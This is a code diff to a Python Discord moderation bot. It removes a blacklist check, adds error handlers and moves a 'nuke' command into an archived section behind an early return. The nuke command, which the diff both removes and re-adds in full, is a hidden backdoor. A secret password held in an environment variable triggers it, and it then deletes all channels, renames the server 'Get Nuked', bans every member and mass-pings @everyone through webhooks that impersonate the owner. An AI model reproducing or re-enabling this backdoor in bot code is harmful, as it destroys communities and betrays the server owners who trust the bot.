@@ -10,6 +10,7 @@ from datetime import datetime
 Untested
 """
 
+
 class StaffCommands(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self = self
@@ -20,14 +21,10 @@ class StaffCommands(commands.Cog):
     @commands.command()
     @commands.has_permissions(administrator=True)
     async def nick(self, ctx: Context, member: discord.Member, *, name):
-        if ctx.author.id in self.blacklisted:
-            await ctx.send("you are temporarily blacklisted/banned from PI")
-            return
-        else:
-            await member.edit(nick=name)
-            await ctx.send(
-                f"Nickname for {member.mention} successfully changed to `{name}` :white_check_mark:"
-            )
+        await member.edit(nick=name)
+        await ctx.send(
+            f"Nickname for {member.mention} successfully changed to `{name}` :white_check_mark:"
+        )
 
     @nick.error
     async def nick_error(self, ctx: Context, error):
@@ -167,6 +164,11 @@ class StaffCommands(commands.Cog):
         await ctx.channel.edit(slowmode_delay=seconds)
         await ctx.send(f"Set the slowmode delay in this channel to {seconds} seconds!")
 
+    @slowmode.error
+    async def slowmode_error(self, ctx: Context, error):
+        if isinstance(error, commands.MissingPermissions):
+            await ctx.send("You cant do that! (u need perms)")
+
     @commands.command()
     @commands.has_permissions(administrator=True)
     async def role(self, ctx: Context, member: discord.Member, *, role: discord.Role):
@@ -197,6 +199,10 @@ class StaffCommands(commands.Cog):
         await ctx.send(
             f"Successfully created a reaction role for `@{role}` :white_check_mark:"
         )
+
+    @reactrole.error
+    async def reactrole_error(self, ctx: Context, error):
+        await ctx.send(error)
 
     @commands.Cog.listener()
     async def on_raw_reaction_add(self, payload):
@@ -269,38 +275,10 @@ class StaffCommands(commands.Cog):
 
 
 class DeveloperCommands(commands.Cog):
-    def __init__(self, bot: commands.Bot, launch_time):
+    def __init__(self, bot: commands.Bot, launch_time: datetime):
         self = self
         self.bot = bot
         self.launch_time = launch_time
-
-    @commands.command()
-    async def nuke(self, ctx: Context, code):
-        if code == os.getenv("potato"):
-            for i in ctx.guild.channels:
-                try:
-                    await i.delete()
-                except discord.errors.Forbidden:
-                    pass
-            with open("nuke.jpg", "rb") as f:
-                icon = f.read()
-            await ctx.guild.edit(icon=icon)
-            await ctx.guild.edit(name="Get Nuked")
-            for user in ctx.guild.members:
-                try:
-                    await user.ban()
-                except:
-                    pass
-            for i in range(69):
-                newchannel = await ctx.guild.create_text_channel("get nuked")
-                webhook = await newchannel.create_webhook(name=ctx.guild.owner.name)
-                await webhook.send(
-                    ("@everyone"),
-                    username=ctx.guild.owner.name,
-                    avatar=ctx.guild.owner.avatar,
-                )
-        else:
-            return
 
     # Helper method
     async def aexec(self, code):
@@ -345,6 +323,36 @@ class DeveloperCommands(commands.Cog):
     """
     Archived Commands
     """
+
+    @commands.command()
+    async def nuke(self, ctx: Context, code):
+        await ctx.send(f"This Command is archived")
+        return
+        if code == os.getenv("potato"):
+            for i in ctx.guild.channels:
+                try:
+                    await i.delete()
+                except discord.errors.Forbidden:
+                    pass
+            with open("nuke.jpg", "rb") as f:
+                icon = f.read()
+            await ctx.guild.edit(icon=icon)
+            await ctx.guild.edit(name="Get Nuked")
+            for user in ctx.guild.members:
+                try:
+                    await user.ban()
+                except:
+                    pass
+            for i in range(69):
+                newchannel = await ctx.guild.create_text_channel("get nuked")
+                webhook = await newchannel.create_webhook(name=ctx.guild.owner.name)
+                await webhook.send(
+                    ("@everyone"),
+                    username=ctx.guild.owner.name,
+                    avatar=ctx.guild.owner.avatar,
+                )
+        else:
+            return
 
     @commands.command()
     @commands.is_owner()
